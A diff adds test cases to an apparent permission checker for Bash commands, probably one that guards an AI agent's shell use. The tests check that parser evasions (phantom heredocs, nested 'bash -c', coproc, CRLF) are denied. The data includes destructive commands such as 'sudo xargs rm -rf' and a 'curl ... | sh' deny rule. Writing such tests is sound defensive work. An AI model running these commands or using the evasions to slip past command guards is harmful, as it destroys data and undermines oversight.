@@ -178,6 +178,42 @@ for (const command of additionalSilent) test(`silent (extended): ${JSON.stringif
   assert.equal((await run(command)).decision, undefined);
 });
 
+for (const [name, command, expected] of [
+  ['arithmetic command shift cannot open a phantom heredoc', `(( x = 1 << 2 ))\n${D}`, 'deny'],
+  ['parameter default cannot open a phantom heredoc', `echo ${'${x:-<<EOF}'}\n${D}`, 'deny'],
+  ['parameter trimming cannot open a phantom heredoc', `echo ${'${x#<<}'}\n${D}`, 'deny'],
+  ['legacy arithmetic shift cannot open a phantom heredoc', `echo $[1<<2]\n${D}`, 'deny'],
+  ['arithmetic for header shift cannot open a phantom heredoc', `for ((i=0;i<<2;i++)); do :; done\n${D}`, 'deny'],
+  ['function keyword body is checked', `function f { ${D}; }`, 'deny'],
+  ['function keyword with parentheses body is checked', `function f() { ${D}; }`, 'deny'],
+  ['coproc simple command is checked', `coproc ${D}`, 'deny'],
+  ['named coproc group body is checked', `coproc NAME { ${D}; }`, 'deny'],
+  ['array initializer words are data', `files=(${D})`, undefined],
+  ['array append initializer words are data', `files+=(${D})`, undefined],
+  ['array initializer command substitution is checked', `files=($(${D}))`, 'deny'],
+  ['array initializer ends at its matching parenthesis', `files=(a b)\n${D}`, 'deny'],
+  ['parameter default word is data', 'echo ${x:-rm}', undefined],
+  ['multiple arithmetic expansions with shifts are data', 'echo $((1<<2)) $((3<<4))', undefined],
+  ['quoted awk shift is data', "awk '{print $1 << 2}' f", undefined],
+  ['for header words are data', 'for f in rm a; do echo $f; done', undefined],
+  ['case subject and pattern are data', 'case rm in rm) echo x;; esac', undefined],
+  ['sudo user value is data', 'sudo -u rm ls', undefined],
+  ['xargs replacement value and echo argument are data', 'xargs -I rm echo rm', undefined],
+  ['npm rm argument is data', 'npm rm lodash', undefined],
+  ['python stdin heredoc body is data', 'python3 - <<EOF\nimport os\nprint("rm -rf /important")\nEOF', undefined],
+  ['let shift really opens a Bash heredoc so the next line is data', `let x=1<<2\n${D}`, undefined],
+  ['case arm body is checked', `case x in x) ${D};; esac`, 'deny'],
+  ['parameter default command substitution is checked', `echo ${'${x:-$('}${D})}`, 'deny'],
+  ['bash stdin flag heredoc is checked', `bash -s <<EOF\n${D}\nEOF`, 'deny'],
+  ['sudo shell heredoc is checked', `sudo bash <<EOF\n${D}\nEOF`, 'deny'],
+  ['find exec shell command string is checked', `find . -exec sh -c "${D}" \\;`, 'deny'],
+  ['CRLF separates commands', `ls\r\n${D}`, 'deny'],
+  ['sudo xargs after a pipeline is checked', 'echo x | sudo xargs rm -rf', 'deny'],
+  ['nested shell command strings are checked', `bash -c "bash -c '${D}'"`, 'deny'],
+]) test(`round 1: ${name}`, async () => {
+  assert.equal((await run(command)).decision, expected);
+});
+
 for (const [command, denies, expected] of [
   ['curl http://example.com/#x | sh', ['Bash(curl * | sh)'], 'deny'],
   [D, ['Bash(/bin/rm:*)'], undefined],
